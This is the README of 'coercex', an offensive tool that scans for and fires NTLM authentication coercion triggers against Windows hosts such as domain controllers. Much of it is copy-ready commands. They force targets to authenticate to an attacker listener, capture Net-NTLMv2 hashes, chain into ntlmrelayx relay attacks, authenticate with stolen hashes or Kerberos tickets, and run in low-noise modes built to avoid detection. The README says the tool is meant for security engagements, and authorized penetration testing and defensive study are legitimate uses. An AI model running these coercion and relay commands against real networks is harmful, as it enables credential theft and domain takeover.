# coercex

Async NTLM authentication coercion scanner built on top of
[Coercer](https://github.com/p0dalirius/Coercer) by
[@p0dalirius](https://github.com/p0dalirius).

Coercer pioneered automated NTLM coercion scanning and established the
method catalogue that coercex builds upon. coercex is an async rewrite
focused on performance and scan accuracy for large-scale engagements.

![coercex demo](assets/demo.gif)

## What coercex adds

| Area | Improvement |
|------|-------------|
| **Async architecture** | `asyncio` with 50-200 concurrent tasks vs synchronous/threading |
| **Connection pooling** | Sessions keyed by (target, pipe, UUID) and reused across attempts |
| **Pre-flight probing** | Tests RPC bindings before triggering -- eliminates ~40-50% of futile attempts |
| **Pipe discovery** | Optional `--discover-pipes` enumerates IPC$ pipes per target to skip missing endpoints |
| **Token-based correlation** | Unique token in every UNC path for definitive callback verification |
| **Rich TUI** | Live progress bars, findings table, and phase indicators (probe/scan/drain) |
| **Extra protocols** | MS-PAR and MS-TSCH (19 methods / 7 protocols total vs Coercer's 17 / 5) |
| **OPSEC modes** | `--stop-on-coerced`, `--delay`, `-c 1 --transport http` for low-noise scans |
| **Test suite** | 202 pytest tests covering scanner, listener, display, and method registry |

## Installation

```bash
uv sync
```

Requires Python 3.13+.

## Quick Start

### Scan

```bash
# Single target (listener IP auto-detected)
coercex scan -t dc01.corp.local -u user -p pass -d corp.local

# Explicit listener, multiple targets, EFSR only
coercex scan -T targets.txt -l 10.0.0.5 -u user -p pass --protocols MS-EFSR

# Fast scan -- stop at first confirmed coercion per target
coercex scan -t dc01 -u user -p pass --stop-on-coerced

# Discover pipes before scanning (skips endpoints whose pipes are absent)
coercex scan -t dc01 -u user -p pass --discover-pipes

# OPSEC-conscious: sequential, HTTP-only, 2 s delay
coercex scan -t dc01 -u user -p pass --stop-on-coerced \
  -c 1 --transport http --delay 2
```

### Coerce

Use alongside ntlmrelayx or any relay tool. coercex fires RPC triggers
only -- it does **not** bind any ports.

```bash
# Trigger all methods toward your relay
coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local

# Only trigger a specific method from scan results
coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --methods 'EfsRpcOpenFileRaw'

# WebDAV only (bypass SMB signing)
coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass --transport http
```

## Authentication

```bash
# Password
coercex scan -t dc01 -u admin -p 'P@ssw0rd' -d corp.local

# NTLM hash
coercex scan -t dc01 -u admin -H 'aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889'

# Kerberos ccache
coercex scan -t dc01 --ccache /tmp/krb5cc_admin -d corp.local

# KRB5CCNAME + -k
export KRB5CCNAME=/tmp/krb5cc_admin
coercex scan -t dc01 -k -d corp.local --dc-host dc01.corp.local

# AES key
coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local
```

## Modes

| Mode | Listener | Binds Ports | Description |
|------|----------|-------------|-------------|
| `scan` | Optional (`-l`) | HTTP + SMB | Triggers methods and confirms callbacks on a local listener. Auto-detects listener IP if `-l` is omitted. |
| `coerce` | **Required** (`-l`) | **None** | Fire-and-forget triggers toward an external relay. Reports `SENT` for every trigger dispatched. |

### Typical workflow

1. **Scan** to find coercible methods on the target.
2. **Start ntlmrelayx** (or similar) pointed at the relay target.
3. **Coerce** with `--methods` to trigger only the working methods.

## Result Classification

| Status | Symbol | Meaning |
|--------|--------|---------|
| `COERCED` | `[+]` | Callback confirmed on our listener (strongest signal) |
| `ACCESSIBLE` | `[~]` | RPC accepted our path but no callback yet |
| `SENT` | `[>]` | Coerce mode -- trigger dispatched, no verification |
| `ACCESS_DENIED` | `[-]` | RPC returned access denied |
| `NOT_AVAILABLE` | `[ ]` | Endpoint or method not available |
| `CONNECT_ERROR` | `[!]` | Could not connect to RPC pipe |
| `TIMEOUT` | `[T]` | Connection or RPC timed out |

## Filtering

```bash
# By protocol
coercex scan -t dc01 -u user -p pass --protocols MS-EFSR MS-RPRN

# By method name (glob)
coercex scan -t dc01 -u user -p pass --methods 'EfsRpc*'

# By method name (regex)
coercex scan -t dc01 -u user -p pass --methods 'EfsRpc.*Raw'

# By named pipe
coercex scan -t dc01 -u user -p pass --pipes '\PIPE\spoolss'

# By transport
coercex scan -t dc01 -u user -p pass --transport smb

# Combine
coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
  --protocols MS-EFSR --methods 'EfsRpcOpenFileRaw'
```

## Protocols and Methods

| Protocol | Methods | Description |
|----------|---------|-------------|
| MS-EFSR | 10 | Encrypting File System Remote Protocol (PetitPotam) |
| MS-RPRN | 2 | Print System Remote Protocol (PrinterBug) |
| MS-DFSNM | 2 | Distributed File System Namespace Management (DFSCoerce) |
| MS-FSRVP | 2 | File Server Remote VSS Protocol (ShadowCoerce) |
| MS-EVEN | 1 | EventLog Remoting Protocol |
| MS-PAR | 1 | Print System Asynchronous Remote Protocol |
| MS-TSCH | 1 | Task Scheduler Service Remote Protocol |

## Scan Phases

1. **Pipe discovery** (optional, `--discover-pipes`) -- enumerates IPC$ pipes
   per target to pre-filter the binding set.
2. **Pre-flight probe** -- tests connectivity to unique RPC bindings; skips
   unreachable endpoints.
3. **Scan / Coerce** -- fires triggers with per-target progress bars.
4. **Drain** -- waits for late callbacks; enriches COERCED results with
   captured Net-NTLMv2 hashes.

## Port Redirect

When the default ports (445/80) are in use, two options exist:

1. **WebDAV format** (automatic): UNC paths become `\\host@4445\share`.
   Requires the WebClient service on the target.
2. **Port redirect** (`--redirect`, Windows only): pydivert NAT rules keep
   UNC paths in standard format. Requires admin privileges.

```bash
coercex scan -t dc01 -u user -p pass --smb-port 4445 --http-port 8080 --redirect
```

## Credits

coercex would not exist without the foundational work of:

- **[Coercer](https://github.com/p0dalirius/Coercer)** by
  [@p0dalirius](https://github.com/p0dalirius) -- the original NTLM
  coercion scanner that defined the method catalogue and scan/coerce/fuzz
  workflow. Coercer remains the reference implementation and supports
  features coercex does not (fuzz mode, XLSX/SQLite export, Python 3.7+
  compatibility).
- **[PetitPotam](https://github.com/topotam/PetitPotam)** by
  [@topotam](https://github.com/topotam) -- original MS-EFSR coercion
  research.
- **[impacket](https://github.com/fortra/impacket)** by Fortra -- the
  underlying SMB/DCERPC library that makes all of this possible.
